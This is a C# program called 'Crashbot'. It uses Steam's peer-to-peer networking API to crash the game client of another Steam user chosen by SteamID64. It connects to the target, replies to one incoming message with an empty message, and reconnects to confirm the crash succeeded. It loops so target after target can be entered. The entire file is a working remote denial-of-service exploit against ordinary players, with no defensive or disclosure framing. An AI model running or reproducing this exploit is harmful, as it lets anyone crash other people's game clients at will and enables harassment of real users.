using Newtonsoft.Json;
using Steamworks;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using static SteamKit2.GC.Dota.Internal.CMsgDOTALeague;

namespace Crashbot
{
    internal class Program
    {
        private static readonly SteamNetworkingConfigValue_t[] LongTimeoutOptions = [
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutConnected,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = 100 }
            }
        ];

        private static readonly SteamNetworkingConfigValue_t[] ConnectionTimeoutOptions = [
            new SteamNetworkingConfigValue_t
            {
                m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32,
                m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutInitial,
                m_val = new SteamNetworkingConfigValue_t.OptionValue { m_int32 = 800 }
            }
        ];

        static void Main(string[] args)
        {
            Environment.CurrentDirectory = Directory.GetParent(Assembly.GetExecutingAssembly()?.Location ?? AppContext.BaseDirectory)!.FullName;
            File.WriteAllText("steam_appid.txt", "387990");

            if (!Steamworks.SteamAPI.Init())
            {
                Console.Clear();
                Console.WriteLine("SteamAPI.Init() failed!");
                return;
            }
            else
            {
                Console.Clear();
                Console.WriteLine("BLoggedOn: " + Steamworks.SteamUser.BLoggedOn());
            }

            Console.WriteLine("Test: 76561198299556567");

            while (true)
            {
                // Gather target
                Console.WriteLine(Environment.NewLine);
                Console.Write("Enter target SteamID64: ");
                ulong target = ulong.Parse(Console.ReadLine()?.Trim() ?? "0");

                // Initiate the connection
                Console.WriteLine("Connecting...");
                var (conn, info) = ConnectAndWait(target, LongTimeoutOptions);

                if (info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected)
                {
                    Console.WriteLine("Connected!");
                }
                else
                {
                    Console.WriteLine("Failed to connect. Possibly Friends Only or Private");
                    continue;
                }

                // Crash the client
                Program.ReadOneAndSendOne(conn, 0, 0, 0);
                Console.WriteLine("Crashing client...");
                Thread.Sleep(500);
                Steamworks.SteamNetworkingSockets.CloseConnection(conn, 0, string.Empty, false);

                // Check if the client crashed
                Console.WriteLine("Checking target...");
                var (_, info2) = ConnectAndWait(target, ConnectionTimeoutOptions);

                bool crashed = info2.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally;
                Console.WriteLine(crashed ? "Successfully Crashed!" : "Failed to Crash. Possibly Friends Only or Private");
            }
        }

        private static (HSteamNetConnection Connection, SteamNetConnectionInfo_t Info) ConnectAndWait(ulong target, SteamNetworkingConfigValue_t[] options)
        {
            var steamuser = new SteamKit2.SteamID(target);
            CSteamID cSteamID = new(steamuser.ConvertToUInt64());

            SteamNetworkingIdentity remoteIdentity = new();
            remoteIdentity.SetSteamID(cSteamID);
            HSteamNetConnection conn = SteamNetworkingSockets.ConnectP2P(ref remoteIdentity, 0, options.Length, options);

            Thread.Sleep(10);
            Steamworks.SteamAPI.RunCallbacks();
            Steamworks.SteamNetworkingSockets.RunCallbacks();
            Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn, out Steamworks.SteamNetConnectionInfo_t info);

            while (info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected
                && info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ProblemDetectedLocally
                && info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_ClosedByPeer)
            {
                Steamworks.SteamAPI.RunCallbacks();
                Steamworks.SteamNetworkingSockets.RunCallbacks();
                Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn, out info);

                Thread.Sleep(10);
            }

            return (conn, info);
        }

        private static void ReadOneAndSendOne(HSteamNetConnection connection, IntPtr data, uint dataLen, int flags)
        {
            int maxMessages = 1;
            while (true)
            {
                IntPtr[] messagePointers = new IntPtr[maxMessages];
                int messageCount = Steamworks.SteamNetworkingSockets.ReceiveMessagesOnConnection(connection, messagePointers, maxMessages);

                if (messageCount > 0)
                {
                    Steamworks.SteamNetworkingSockets.SendMessageToConnection(connection, data, dataLen, flags, out long _);
                    Steamworks.SteamNetworkingSockets.FlushMessagesOnConnection(connection);

                    Steamworks.SteamAPI.RunCallbacks();
                    Steamworks.SteamNetworkingSockets.RunCallbacks();
                    break;
                }
                else
                {
                    Thread.Sleep(10);
                }
            }
        }
    }
}
